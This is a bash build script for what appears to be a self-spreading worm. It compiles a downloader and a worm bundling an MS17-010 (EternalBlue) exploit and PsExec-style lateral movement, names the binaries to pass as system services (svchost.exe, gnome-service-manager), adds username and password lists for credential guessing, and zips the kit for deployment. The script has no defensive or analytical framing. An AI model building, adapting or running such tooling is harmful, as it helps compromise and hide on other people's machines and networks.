#!/bin/bash
rm -rf ./dist
rm file.zip
mkdir -p dist

GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/lindown downloader.go
GOOS=windows GOARCH=386 go build -o ./dist/windown.exe downloader.go pysexec.go

GO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o ./dist/gnome-service-manager worm.go ms17_010.go pysexec.go
GOOS=windows GOARCH=386 go build -o ./dist/svchost.exe worm.go ms17_010.go pysexec.go

cp user.txt ./dist/
cp passwds.txt ./dist/

cp 32 ./dist/
cp 32_1 ./dist/
cp 64 ./dist/
cp 64_1 ./dist/
cp PsExec.exe ./dist/
cp NetworkManager ./dist/
cp wf.exe ./dist/
cp pysexec_32 ./dist/
cp pysexec_64 ./dist/

cd dist && zip -r ../file.zip *
